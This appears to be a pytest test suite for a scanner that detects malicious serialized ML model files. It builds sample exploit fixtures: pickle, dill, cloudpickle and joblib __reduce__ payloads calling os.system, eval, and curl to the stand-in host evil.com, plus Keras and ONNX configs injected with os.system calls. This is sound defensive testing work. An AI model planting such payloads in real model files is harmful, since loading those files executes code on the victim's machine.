"""Unit tests for ModelScanScanner."""
import pytest
import tempfile
import os
import sys
import pickle
import json
import zipfile
import zlib
import io
import struct
import time
import types
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.static_scan.scanners.modelscan_scanner import ModelScanScanner
from tests.fixtures.malicious_pickles import (
    generate_malicious_pickles,
    generate_benign_pickles,
    generate_pytorch_exploits,
    PickleExploits
)

# Import optional libraries
try:
    import h5py
except ImportError:
    h5py = None

try:
    import numpy as np
except ImportError:
    np = None

try:
    import tensorflow as tf
    from tensorflow import keras
except ImportError:
    tf = None
    keras = None

try:
    import onnx
    from onnx import helper, TensorProto
except ImportError:
    onnx = None
    helper = None
    TensorProto = None

try:
    import dill
except ImportError:
    dill = None

try:
    import cloudpickle
except ImportError:
    cloudpickle = None

try:
    import joblib
except ImportError:
    joblib = None


class TestModelScanScanner:
    """Unit tests for ModelScan scanner."""
    
    @pytest.fixture
    def scanner(self):
        """Create scanner instance."""
        return ModelScanScanner()
    
    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for test files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir
    
    @pytest.mark.skipif(h5py is None or np is None, reason="h5py or numpy not installed")
    def test_scan_keras_h5_files(self, scanner, temp_dir):
        """Test scanning of Keras H5 model files."""
        # Create proper H5 file using h5py
        h5_path = os.path.join(temp_dir, "model.h5")
        
        # Create a valid H5 file with Keras structure
        with h5py.File(h5_path, 'w') as f:
            # Add model weights (typical Keras structure)
            model_weights = f.create_group('model_weights')
            layer1 = model_weights.create_group('dense_1')
            layer1.create_dataset('kernel:0', data=np.random.randn(10, 5))
            layer1.create_dataset('bias:0', data=np.random.randn(5))
            
            # Add model config with potential malicious content
            malicious_config = {
                "class_name": "Sequential",
                "config": {
                    "name": "model",
                    "layers": [{
                        "class_name": "Lambda",
                        "config": {
                            "function": "__import__('os').system",
                            "arguments": {"command": "whoami"}
                        }
                    }]
                }
            }
            f.attrs['model_config'] = json.dumps(malicious_config)
        
        result = scanner.scan(temp_dir)
        
        # Check that H5 file was scanned
        assert result.files_scanned
        assert any('model.h5' in f for f in result.files_scanned)
    
    @pytest.mark.skipif(tf is None or keras is None, reason="TensorFlow/Keras not installed")
    def test_scan_keras_v3_format(self, scanner, temp_dir):
        """Test scanning of Keras V3 format (.keras files)."""
        # Create a simple Keras model with a potentially malicious Lambda layer
        model = keras.Sequential([
            keras.layers.Dense(128, activation='relu', input_shape=(10,)),
            keras.layers.Lambda(lambda x: x * 2, name="lambda_layer"),
            keras.layers.Dense(10, activation='softmax')
        ])
        
        # Save in Keras V3 format (.keras)
        keras_path = os.path.join(temp_dir, "model.keras")
        model.save(keras_path, save_format='keras')
        
        # Also create a malicious variant by modifying the saved file
        malicious_keras_path = os.path.join(temp_dir, "malicious_model.keras")
        
        # Copy and modify the keras file to inject malicious config
        with zipfile.ZipFile(keras_path, 'r') as zf_in:
            with zipfile.ZipFile(malicious_keras_path, 'w') as zf_out:
                for item in zf_in.infolist():
                    data = zf_in.read(item.filename)
                    if item.filename == 'config.json':
                        # Modify config to inject malicious lambda
                        config = json.loads(data)
                        # Find and modify the lambda layer
                        for layer in config.get('config', {}).get('layers', []):
                            if layer.get('class_name') == 'Lambda':
                                layer['config']['function'] = "__import__('os').system"
                                layer['config']['arguments'] = "echo pwned"
                        data = json.dumps(config).encode()
                    zf_out.writestr(item, data)
        
        result = scanner.scan(temp_dir)
        
        # Should scan .keras files
        assert result.files_scanned
        assert any('.keras' in f for f in result.files_scanned)
    
    def test_scan_tensorflow_savedmodel(self, scanner, temp_dir):
        """Test scanning of TensorFlow SavedModel format."""
        # Create SavedModel directory structure
        saved_model_dir = os.path.join(temp_dir, "saved_model")
        os.makedirs(os.path.join(saved_model_dir, "variables"))
        os.makedirs(os.path.join(saved_model_dir, "assets"))
        
        # Create saved_model.pb
        pb_path = os.path.join(saved_model_dir, "saved_model.pb")
        with open(pb_path, 'wb') as f:
            # Minimal protobuf
            f.write(b'\x08\x01\x12\x00')
        
        # Create variables files
        var_index = os.path.join(saved_model_dir, "variables", "variables.index")
        with open(var_index, 'wb') as f:
            f.write(b'TensorFlow Variables Index')
        
        var_data = os.path.join(saved_model_dir, "variables", 
                               "variables.data-00000-of-00001")
        with open(var_data, 'wb') as f:
            f.write(b'TF_CHECKPOINT_V2')
        
        result = scanner.scan(temp_dir)
        
        # Should process SavedModel
        assert result is not None
        assert result.files_scanned
    
    def test_scan_pytorch_models(self, scanner, temp_dir):
        """Test scanning of PyTorch model files."""
        pytorch_exploits = generate_pytorch_exploits()
        
        for name, data in pytorch_exploits.items():
            ext = '.pth' if 'pth' in name else '.pt'
            file_path = os.path.join(temp_dir, f"{name}{ext}")
            with open(file_path, 'wb') as f:
                f.write(data)
        
        result = scanner.scan(temp_dir)
        
        # Should detect issues in malicious PyTorch files
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    @pytest.mark.skipif(onnx is None or helper is None or TensorProto is None or np is None, 
                        reason="ONNX or numpy not installed")
    @pytest.mark.xfail(reason="ModelScan doesn't support ONNX format - this is a known limitation")
    def test_scan_onnx_models(self, scanner, temp_dir):
        """Test scanning of ONNX model files."""
        # Create ONNX file
        onnx_path = os.path.join(temp_dir, "model.onnx")
        
        # Create a minimal valid ONNX model
        # Define input and output
        input_tensor = helper.make_tensor_value_info(
            'input', TensorProto.FLOAT, [1, 3, 224, 224]
        )
        output_tensor = helper.make_tensor_value_info(
            'output', TensorProto.FLOAT, [1, 1000]
        )
        
        # Create a simple node (Identity operation)
        node = helper.make_node(
            'Identity',
            inputs=['input'],
            outputs=['output'],
        )
        
        # Create the graph
        graph = helper.make_graph(
            [node],
            'test_model',
            [input_tensor],
            [output_tensor],
        )
        
        # Create the model with potentially malicious metadata
        model = helper.make_model(graph)
        model.metadata_props.append(
            onnx.StringStringEntryProto(
                key='malicious_key',
                value="__import__('os').system('calc')"
            )
        )
        
        # Save the model
        onnx.save(model, onnx_path)
        
        result = scanner.scan(temp_dir)
        
        # Should scan ONNX file
        assert result.files_scanned
        assert any('.onnx' in f for f in result.files_scanned)
    
    def test_scan_pickle_in_model(self, scanner, temp_dir):
        """Test detection of malicious pickle in model files."""
        # Create model file with embedded pickle exploit
        model_path = os.path.join(temp_dir, "model.pkl")
        exploit = PickleExploits.OSSystemExploit()
        with open(model_path, 'wb') as f:
            pickle.dump({
                'model': exploit,
                'config': {'layers': 10}
            }, f)
        
        result = scanner.scan(temp_dir)
        
        # Should detect malicious pickle
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    def test_scan_empty_directory(self, scanner, temp_dir):
        """Test scanning empty directory."""
        result = scanner.scan(temp_dir)
        
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
        assert result.files_scanned == []
    
    def test_scan_benign_models(self, scanner, temp_dir):
        """Test scanning of benign model files."""
        # Create benign pickle model
        model_path = os.path.join(temp_dir, "benign_model.pkl")
        benign_model = {
            'weights': [[0.1, 0.2], [0.3, 0.4]],
            'config': {
                'layers': 3,
                'activation': 'relu'
            }
        }
        with open(model_path, 'wb') as f:
            pickle.dump(benign_model, f)
        
        result = scanner.scan(temp_dir)
        
        # Should be safe
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
    
    def test_scan_nested_directory_structure(self, scanner, temp_dir):
        """Test scanning of nested directory structures."""
        # Create nested directories
        nested_dir = os.path.join(temp_dir, "models", "production", "v1")
        os.makedirs(nested_dir)
        
        # Add model files at different levels
        locations = [
            (temp_dir, "root_model.pkl"),
            (os.path.join(temp_dir, "models"), "models_model.pt"),
            (nested_dir, "nested_model.pth")
        ]
        
        for dir_path, filename in locations:
            file_path = os.path.join(dir_path, filename)
            
            if filename.endswith(('.pt', '.pth')):
                # Create proper PyTorch ZIP format
                buffer = io.BytesIO()
                with zipfile.ZipFile(buffer, 'w') as zf:
                    # Add version file
                    zf.writestr('version', b'3\n')
                    # Add pickled data
                    data_pkl = pickle.dumps({'data': 'test'})
                    zf.writestr('data.pkl', data_pkl)
                
                with open(file_path, 'wb') as f:
                    f.write(buffer.getvalue())
            else:
                # Regular pickle for .pkl files
                with open(file_path, 'wb') as f:
                    pickle.dump({'data': 'test'}, f)
        
        result = scanner.scan(temp_dir)
        
        # Should find all model files
        assert len(result.files_scanned) >= 3
    
    def test_scan_large_model_file(self, scanner, temp_dir):
        """Test scanning of large model files."""
        # Create large model (5MB)
        large_model = {
            'weights': [[0.1] * 1000 for _ in range(1000)],
            'metadata': {'size': 'large'}
        }
        
        model_path = os.path.join(temp_dir, "large_model.pkl")
        with open(model_path, 'wb') as f:
            pickle.dump(large_model, f)
        
        # Should handle large files
        start = time.time()
        result = scanner.scan(temp_dir)
        duration = time.time() - start
        
        # Should complete in reasonable time
        assert duration < 30
        assert result is not None
    
    def test_scan_corrupted_model(self, scanner, temp_dir):
        """Test handling of corrupted model files."""
        # Create corrupted model file
        corrupted_path = os.path.join(temp_dir, "corrupted.pth")
        with open(corrupted_path, 'wb') as f:
            # Start with valid ZIP header (PyTorch format)
            f.write(b'PK\x03\x04')
            # Then corrupt data
            f.write(b'CORRUPTED' * 100)
        
        # Should handle corruption gracefully
        result = scanner.scan(temp_dir)
        assert result is not None
    
    def test_scan_result_structure(self, scanner, temp_dir):
        """Test that scan results have correct structure."""
        # Add a test file
        test_path = os.path.join(temp_dir, "test.pkl")
        with open(test_path, 'wb') as f:
            pickle.dump({'test': 'data'}, f)
        
        result = scanner.scan(temp_dir)
        
        # Verify result structure
        assert result.scanner_name == 'modelscan'
        assert isinstance(result.scan_duration, float)
        assert result.scan_duration >= 0
        assert result.verdict in ["SAFE", "SUSPICIOUS", "MALICIOUS"]
        assert isinstance(result.issues_count, int)
        assert isinstance(result.files_scanned, list)
        assert isinstance(result.affected_files, list)
        assert isinstance(result.scanner_data, dict)
    
    @pytest.mark.skipif(dill is None, reason="dill not installed")
    def test_scan_dill_format(self, scanner, temp_dir):
        """Test scanning of dill serialized files."""
        # Create benign dill file
        benign_dill_path = os.path.join(temp_dir, "model_dill.pkl")
        benign_data = {
            'model_type': 'neural_network',
            'weights': [[0.1, 0.2], [0.3, 0.4]],
            'lambda_func': lambda x: x * 2  # Dill can serialize lambdas
        }
        with open(benign_dill_path, 'wb') as f:
            dill.dump(benign_data, f)
        
        # Create malicious dill file
        malicious_dill_path = os.path.join(temp_dir, "malicious_dill.pkl")
        
        class DillExploit:
            def __reduce__(self):
                import os
                return (os.system, ('echo "dill exploit" > /tmp/dill_pwned.txt',))
        
        with open(malicious_dill_path, 'wb') as f:
            dill.dump({'model': DillExploit(), 'type': 'dill'}, f)
        
        result = scanner.scan(temp_dir)
        
        # Should detect malicious dill file
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert any('dill' in f.lower() for f in result.files_scanned)
    
    @pytest.mark.skipif(cloudpickle is None, reason="cloudpickle not installed")
    def test_scan_cloudpickle_format(self, scanner, temp_dir):
        """Test scanning of cloudpickle serialized files."""
        # Create benign cloudpickle file
        benign_cp_path = os.path.join(temp_dir, "model_cloudpickle.pkl")
        
        # Cloudpickle can serialize more complex objects
        def custom_function(x):
            return x ** 2
        
        benign_data = {
            'function': custom_function,
            'module': types,
            'weights': [[1.0, 2.0], [3.0, 4.0]]
        }
        with open(benign_cp_path, 'wb') as f:
            cloudpickle.dump(benign_data, f)
        
        # Create malicious cloudpickle file
        malicious_cp_path = os.path.join(temp_dir, "malicious_cloudpickle.pkl")
        
        class CloudpickleExploit:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (['curl', 'evil.com/cloudpickle'],))
        
        with open(malicious_cp_path, 'wb') as f:
            cloudpickle.dump({
                'model': CloudpickleExploit(),
                'type': 'cloudpickle_exploit'
            }, f)
        
        result = scanner.scan(temp_dir)
        
        # Should detect malicious cloudpickle
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    @pytest.mark.skipif(joblib is None, reason="joblib not installed")
    def test_scan_joblib_format(self, scanner, temp_dir):
        """Test scanning of joblib serialized files."""
        # Create standard joblib file
        joblib_path = os.path.join(temp_dir, "model.joblib")
        model_data = {
            'algorithm': 'RandomForest',
            'n_estimators': 100,
            'max_depth': 10,
            'weights': [[0.5, 0.6], [0.7, 0.8]]
        }
        with open(joblib_path, 'wb') as f:
            joblib.dump(model_data, f)
        
        # Create compressed joblib file
        joblib_z_path = os.path.join(temp_dir, "model_compressed.joblib")
        with open(joblib_z_path, 'wb') as f:
            joblib.dump(model_data, f, compress=3)
        
        # Create malicious joblib file
        malicious_joblib_path = os.path.join(temp_dir, "malicious.joblib")
        
        class JoblibExploit:
            def __reduce__(self):
                import os
                return (eval, ("__import__('os').system('whoami')",))
        
        with open(malicious_joblib_path, 'wb') as f:
            joblib.dump({'estimator': JoblibExploit()}, f)
        
        result = scanner.scan(temp_dir)
        
        # Should scan joblib files and detect malicious content
        assert result.files_scanned
        assert any('.joblib' in f for f in result.files_scanned)
        # Should detect the malicious joblib file
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    def test_scan_mixed_serialization_formats(self, scanner, temp_dir):
        """Test scanning directory with mixed serialization formats."""
        # Create files with different serialization formats
        
        # Standard pickle
        with open(os.path.join(temp_dir, "model.pkl"), 'wb') as f:
            pickle.dump({'type': 'pickle', 'data': [1, 2, 3]}, f)
        
        # Pickle protocol 5 (Python 3.8+)
        with open(os.path.join(temp_dir, "model_p5.pkl"), 'wb') as f:
            pickle.dump({'type': 'pickle_protocol_5'}, f, protocol=5)
        
        if dill:
            with open(os.path.join(temp_dir, "model_dill.pkl"), 'wb') as f:
                dill.dump({'type': 'dill', 'func': lambda x: x}, f)
        
        if cloudpickle:
            with open(os.path.join(temp_dir, "model_cp.pkl"), 'wb') as f:
                cloudpickle.dump({'type': 'cloudpickle'}, f)
        
        if joblib:
            with open(os.path.join(temp_dir, "model.joblib"), 'wb') as f:
                joblib.dump({'type': 'joblib'}, f)
        
        result = scanner.scan(temp_dir)
        
        # Should scan all serialization formats
        assert result.files_scanned
        assert len(result.files_scanned) >= 2  # At least pickle files
        assert result.verdict == "SAFE"  # All are benign